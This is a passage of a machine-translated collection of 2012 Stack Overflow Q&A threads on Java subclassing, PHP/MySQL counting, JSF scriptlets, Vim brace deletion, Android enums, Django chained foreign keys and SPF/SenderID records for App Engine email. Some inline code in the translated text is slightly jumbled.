   public static void main(String[] args) {

   BoundedPower bp = new BoundedPower(5);
   double test = bp.powN(4);
   System.out.println(test);
 }
} 
```

您不必将计算公式复制到子类（只需调用`super.powN(..)`）。您也不需要`Power`within的另一个实例`BoundedPower`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T22:05:49.403

这大概就是他们心中的想法：

```
public class Power {
 public double powN(double x, int n) {
    double result = 1.0;
    for (int i = 0; i < n; i++) {
        result = result * x;
    }
    return result;
  }
}

public class BoundedPower extends Power {
  private final double maxX;

  public BoundedPower(double maxX) {
    this.maxX = maxX;
  }

  public double powN(double x, int n) {
    if (x > maxX) {
      throw new IllegalArgumentException("x value [" + x + "] " + 
        "greater than expected max [" + maxX + "]");
    }
    return super.powN(x, n);
  }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-11T22:16:36.463

我会以不同的方式来做。从你所说的 BoundedPower 类只对有界 x（最多 MAX_X）有意义。

因此，我不允许创建 x 大于 MAX_X 的对象（即，对于无界 x，不能存在 BoundedPower 对象）

因此，除了您构建 BoundedPower 实例的方式之外，该实现将与 Power 实现完全相同：您首先检查构建它是否有意义

```
 public class BoundedPower extends Power {

        private static final double MAX_X = 1000000; //makes no sense to be public

        public static BoundedPower newBoundedPower(int n)
                                   throws IllegalNumberException{

               if(x > MAX_X) throw new IllegalNumberException();
               return new BoundedPower(x);
        }

        private BoundedPower(double x) {
               super(x);
        }
  } 
```

# php - 从 MySQL 表中返回每个唯一用户以及每个用户的行数

> ID：11917975
> 
> 赞同：0
> 
> 时间：2012-08-11T21:56:55.343
> 
> 标签：php, mysql, select, while-loop

我正在使用以下 MySQL 查询为数据库中的用户生成一个表。该查询旨在为每个用户只返回一行，即使每个用户有多行。这很好用，但是我还需要计算每个用户的唯一条目数，以输入它声明**HERE**的表。我是否需要使用另一个查询来返回所有条目的计数，如果需要，我如何将其与我已有的代码集成？

```
$query="SELECT from_user, COUNT(*) AS num FROM tracks GROUP BY from_user ORDER BY COUNT(*) DESC";
$result=mysql_query($query) or die(mysql_error());

        while ($row = mysql_fetch_array($result)) {
        $user = $row['from_user'];

        echo "<tr>";
        echo "<td>".$user."</td>";
        echo "<td>uploads (**HERE**)</td>";
        echo "<td>favourites (count)</td>";
        echo "</tr>";
        }
?>
</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:19:04.347

因为您已经创建了自定义字段“num”，所以可以使用它来获取计数！

在后面添加以下行`user = ...`

```
$count = $row['num']; 
```

那么你就可以

```
echo "<td>uploads ($count)</td>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-16T18:05:41.070

它想念你的表结构来知道你的字段名，但是，如果我很好地理解你的问题，你可以在 mysql中使用 count + [distinct 。](http://dev.mysql.com/doc/refman/5.0/en/distinct-optimization.html)你也可以检查[这个答案](https://stackoverflow.com/questions/5737628/mysql-count-distinct)。

```
SELECT DISTINCT(from_user) AS user, 
COUNT(from_user) AS num 
FROM tracks 
GROUP BY from_user 
ORDER BY num DESC"; 
```

对于第二个问题，您可以进行第二次查询，或者进行 join tracking 。

我认为，在您的情况下，您更容易在循环内进行第二次查询以从“用户”结果中获取所有详细信息。

```
$query1="SELECT DISTINCT(from_user), COUNT(*) AS num 
FROM tracks 
GROUP BY from_user 
ORDER BY COUNT(*) DESC";

$query2="SELECT * FROM tracks";

$result1=mysql_query($query1) or die(mysql_error());
$result2=mysql_query($query2) or die(mysql_error());

$user_array = array();

while ($row = mysql_fetch_array($result1)) {

    $user = $row['from_user'];
    $num = $row['num'];

    $uploads_array = array();

    while ($sub_row = mysql_fetch_array($result2)) { 
      if( $sub_row['from_user'] == $user ) {
            //for example only due to the unknown structure of your table
            $uploads_array[] = array( 
                "file_name" => $sub_row['file_name'], 
                "file_url" => $sub_row['file_url'] 
            ); 
      }
    }

    $user_array[] = array( 
        "name" => $user, 
        "num_entry" => $num, 
        "actions" => $uploads_array
    );

}

// now the table with all data is stuctured and you can parse it

foreach($user_array as $result) {
    $upload_html_link_arr = array();
    $user = $result['name'];
    $num_entry = $result['num_entry'];
    $all_actions_from_user_array = $result['actions'];

    foreach($all_actions_from_user_array as $upload) { 
        $upload_html_link_arr[] = sprintf('<a href="%s">%s</a>', $upload["file_url"],$upload["file_name"]);
    }

    $upload_html_link = implode(', ',$upload_html_link_arr);

    $full_row = sprintf("<tr><td>%s</td><td>uploads : %s</td><td>favourites (%d)</td></tr>", $user, $upload_html_link, $num_entry);

    // now just echo the full row or store it to a table for the final echo.
    echo $full_row;
} 
```

我希望这有帮助，迈克

# jsp - 在脚本中使用 getRowIndex

> ID：11917980
> 
> 赞同：0
> 
> 时间：2012-08-11T21:57:26.683
> 
> 标签：jsp, jsf, datatable, scriptlet

我正在尝试在 scriplet 中获取 JSF 数据表的行索引。

使用 JSF 组件，它就像一个魅力：

```
<h:outputText value="#{Operations.postsDataTable.rowIndex}" /> 
```

但是当我使用这样的脚本时：

```
<% out.println(Operations.getPostsDataTable().getRowIndex()); %> 
```

然后它将`-1`为每一行打印。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:26:09.713

> *我究竟做错了什么？*

直言不讳，在你[不应该](https://stackoverflow.com/questions/3177733/how-to-avoid-java-code-in-jsp-files/3180202#3180202)使用*scriptlet*的情况下使用. 自十年前的 JSP 2.0 以来，不鼓励使用它们。

您的具体问题是因为它们在视图构建期间运行，而不是在视图渲染期间运行，就像 JSTL 和所有其他标记处理程序一样。此答案中对此进行了详细说明：[JSF2 Facelets中的JSTL ...有意义吗？](https://stackoverflow.com/questions/3342984/jstl-in-jsf2-facelets-makes-sense)只需将“JSTL”替换为“scriptlet”即可了解发生了什么。总结：它们不会与 JSF 组件“同步”运行。它们是在构建 JSF 组件树期间执行的，而不是在 JSF 组件树生成 HTML 输出的过程中，正如您所期望的那样。

顺便说一句，在 JSP 的后续[Facelets](http://docs.oracle.com/javaee/6/tutorial/doc/giepx.html) (XHTML) 中，已经不可能使用*scriptlet*了，所以您已经被迫以“正确的方式”做事。

# vim - 如何删除 Vim 中的大括号？

> ID：11917981
> 
> 赞同：5
> 
> 时间：2012-08-11T21:57:29.970
> 
> 标签：vim

我有以下文字：

```
Monkeys eat {bananas}. 
```

我的光标在单词的中间`banana`：

```
Monkeys eat {bana|nas}. 
```

这里的`|`符号表示光标的位置。

如何从那里删除大括号？

我可以用一个简单的改变`bananas`to ，所以也许我可以使用类似的技巧来摆脱and字符？`apples``ci}apples``{``}`

另外，即使在这种情况下，我也可以这样做，这实际上是我真正需要做的吗？

```
networks {
    local
    is|p
} 
```

（上面的简化示例只是为了介绍这个概念。）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-11T22:00:47.387

使用 Tim Pope 出色的[环绕](http://www.vim.org/scripts/script.php?script_id=1697).vim 插件（我强烈推荐），您可以`d``s``{`删除*环绕`{`*

我知道，当您可以找到本机键序列时，添加另一个插件并不总是理想的解决方案，但surround.vim 非常有用，因为它还可以处理 XML/HTML 标记并在复杂的文本对象上执行附件。我认为它是那些“困在荒岛上，任何情况下都必须有”的插件之一。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-12T01:55:46.257

该任务可以通过 Vim 内置的文本动作来完成。删除大括号内的文本，选择大括号，然后将之前删除的文本粘贴到它们上面：

```
di{v%p 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-11T22:52:19.363

那这个呢：

```
yiBvaBp 
```

没有插件，简单。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-11T22:01:04.473

删除大括号并保留其他所有内容？

```
mz[{x]}x`z 
```

## 展开

`:help m`- 设置一个标记。在这种情况下，标记初始光标位置，以便我可以在最后返回那里。`:help [{`- 将光标移动到包围光标的最小块的左大括号。`:help x`- 删除现在光标下的大括号。`]}`和`x`- 对右括号做同样的事情。最后

```
help ` 
```

回到标记位置，`z`开始时调用创建的那个。

“插件”不是我的风格...

# java - 安卓的枚举状态模式

> ID：11917984
> 
> 赞同：1
> 
> 时间：2012-08-11T21:58:31.473
> 
> 标签：java, android, design-patterns, enums, state-pattern

我正在尝试创建一个 Enum STATE 模式，以便我可以设置我的操作的当前状态。在 C# 中（我认为）我使用了这种模式：

```
Enum State { STARTED, STOPPED, PAUSED };
State _s;

public foo() {
   _s = State.STARTED;
} 
```

我确实在某个地方读到了您不应该或不能在 Android 中使用 Enum 的内容。如何在 Android 中复制这种设计模式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:17:59.500

你绝对可以使用它们。Android 的库不会延续神话/过时的建议。从一个切换到另一个很容易，所以从枚举开始，只有在遇到性能问题时才进行更改，但我怀疑你会这样做。

# php - 如何从 $_SESSION 元素创建数组？

> ID：11917988
> 
> 赞同：0
> 
> 时间：2012-08-11T21:59:24.230
> 
> 标签：php, arrays, session

```
$_SESSION['allCaps']=array("Calendar.png", "CD.png", "Chain.png"); 
```

在下一页，我需要随机播放这些元素，而不是 $_SESSION 本身。
那么，我怎样才能扭转这个过程：

```
$array = elements_from_$_SESSION['allCaps']  // Calendar.png... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T22:01:16.253

```
$array = $_SESSION['allCaps'];
shuffle($array); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T22:04:51.883

```
 $array = $_SESSION['allCaps']; 
    shuffle($array);
```

# django - 链接外键

> ID：11917993
> 
> 赞同：2
> 
> 时间：2012-08-11T22:00:10.950
> 
> 标签：django, django-models, django-admin, foreign-keys

我有几个看起来像这样的模型：

```
class System(models.Model):
    '''Defines a system'''
    system_desc = models.CharField('System Name', max_length=50)

class SystemGroup(models.Model):
    '''Groups within a 'System' (ie. Customers, regions, divisions, etc. '''
    group_desc = models.CharField('Group Name',max_length=25)
    system = models.ForeignKey(System)

class QueryData(models.Model):
    '''Queries related to a 'System' (ie. Active users against System1, Orders today in system2, etc. '''
    qry_desc = models.CharField('Query Description', max_length=50)
    system = models.ForeignKey(System)

class UserDashboard(models.Model):
    '''User specific Dashboard '''
    user = models.ForeignKey(User)
    board_name = models.CharField('Dashboard Name', max_length=50)

class UserDashboardGroup(models.Model):
    '''Groups on the dashboard (ie. 'System 1's Key Indicators', 'System 2's Hot Sheet', etc. '''
    group_desc = models.CharField('Group Display Title', max_length=50)
    user = models.ForeignKey(User)
    dashboard = models.ForeignKey(UserDashboard)
    system = models.ForeignKey(System)
    system_group = models.ForeignKey(SystemGroup)

class UserGroupQuery(models.Model):
    '''Queries that run in a specific group on the dashboard (ie. Within 'System 1's Key Indicators, we run queries for active users today, orders in the last hour, etc. '''
    user = models.ForeignKey(User)
    dashboard = ChainedForeignKey(UserDashboard, chained_field='user', chained_model_field='user', show_all=False, auto_choose=True)
    user_dashboard_group = ChainedForeignKey(UserDashboardGroup, chained_field='dashboard', chained_model_field='dashboard')
    query = models.ForeignKey(QueryData) 
```

我在最后一部分遇到问题。我想限制基于选定的管理页面中显示的“查询” `user_dashboard_group`。不过，根据我目前的模型，我不确定如何做到这一点。`query`并且`user_dashboard_group`两者都有一个外键`System`，但彼此没有。不过，要得到这个，我必须得到`user_dashboard_group`'s`system`然后用它来过滤`QueryData`. 我怎样才能做到这一点？

**编辑** 我正在添加图片以（希望）更好地描述我想要做的事情。在步骤 1 中，用户输入这组查询的名称。该组与系统 (#2) 和系统内的预定义组 (#3) 相关联（将 #3 视为“客户”或“区域”等，而 #1 和 #3 不是一回事，尽管命名相似）。然后，他们在此内联表单上选择“保存并继续编辑”，第 4 步的下拉菜单将填充来自上述表单的信息。一旦第 4 步进行了选择，我希望第 5 步仅填充来自关联系统的数据。由于#2 包含此信息，我希望这样做相当容易，但我无法弄清楚链接。

![演示仪表板](../Images/e776738f2419a35db098edacfd191578.png)

我也意识到我没有提到我正在使用[django-smart-selects](https://github.com/digi604/django-smart-selects/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T08:49:29.000

我从未使用过 django-smart-selects，但是按照文档，我希望

```
query = models.ChainedForeignKey(QueryData,**kwargs) 
```

代替

```
query = models.ForeignKey(QueryData) 
```

因为您希望查询中的选项取决于其他选择。这种理解正确吗？如果是这样，那只是关于定义正确的 **kwargs。

对于 **kwargs，我会提出这样的建议

**更新**

```
chained_field='query', chained_model_field='user_dashboard_group__system__query_set__query' 
```

假设在这两种情况下字段名称都是 'system。我很确定这正确地描述了这种关系。我只是不确定 django-smart-selects 是否支持该语法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T04:33:33.403

与一个关系相同的方式，除了两个关系。

```
field__relation1__relation2 
```

# google-app-engine - 使用 GAE 发送电子邮件时的发件人 ID 记录

> ID：11917995
> 
> 赞同：2
> 
> 时间：2012-08-11T22:00:23.207
> 
> 标签：google-app-engine, email, google-apps, sender-id

我的 GAE 应用程序发送电子邮件，我按照[Jeff Atwood 的优秀文章](http://www.codinghorror.com/blog/2010/04/so-youd-like-to-send-some-email-through-code.html)提高了电子邮件发送的可能性。

前两个步骤非常简单，但设置发件人 ID 记录更具挑战性。这篇文章提供了一个“向导”的链接来帮助做到这一点，但我不知道向导中许多问题的答案。

我将 Google Apps 用于电子邮件，因此我认为 Sender ID 记录对于我的情况下的许多其他人（Google Apps 和 GAE 用户）应该是相同的。

谁能为此指出我的发件人ID记录？

编辑：

本页[介绍](http://docs.amazonwebservices.com/ses/latest/DeveloperGuide/SPF.html)了如何为 Amazon SES 设置 SPF 和 SenderID 记录，并为 SPF 提供以下 TXT 记录：

```
v=spf1 include:amazonses.com -all 
```

以及 SenderID 的以下 TXT 记录：

```
spf2.0/pra include:amazonses.com -all 
```

Leontx 的回答似乎给出了 SPF 记录而不是 SenderID 记录。

此外，当我查看使用 GAE 发送的电子邮件的标题时，有注释说即使我没有将上述任何 TXT 记录添加到我的域中，SPF 身份验证也会通过。标题中没有关于 SenderID 的信息。

我仍然对此感到困惑，但我现在将使用 Amazon SES 发送电子邮件。它真的很便宜，而且亚马逊似乎比谷歌更小心地帮助确保电子邮件被送达。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T01:51:11.540

这是我必须创建的 TXT 记录才能让 SenderID 通过：

```
Host: @
Text value: v=spf1 include:_spf.google.com ~all 
```

但是我必须让 SenderID 和 DKIM 都通过才能将邮件发送到 Hotmail 的收件箱。为了让 DKIM 通过，我必须为我们的 GAE 应用程序创建一个与电子邮件发件人地址的域相匹配的自定义域。然后我通过该域的 Google Apps 帐户启用了 DKIM。然后它终于奏效了。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-11T23:10:44.393

GAE 邮件（我使用 Python）在您发送邮件时不会给出任何反馈。要接收反馈，您必须使用其他服务/API。我在我的应用程序中使用 Amazon SES。